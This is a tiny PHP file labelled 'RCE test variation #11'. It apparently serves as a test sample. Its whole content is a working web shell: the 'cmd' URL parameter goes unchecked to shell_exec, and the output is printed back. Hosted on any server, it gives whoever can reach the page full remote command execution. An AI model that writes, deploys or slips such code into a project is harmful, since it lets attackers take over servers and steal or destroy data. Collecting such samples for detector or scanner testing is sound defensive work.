<?php
// RCE test variation #11
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>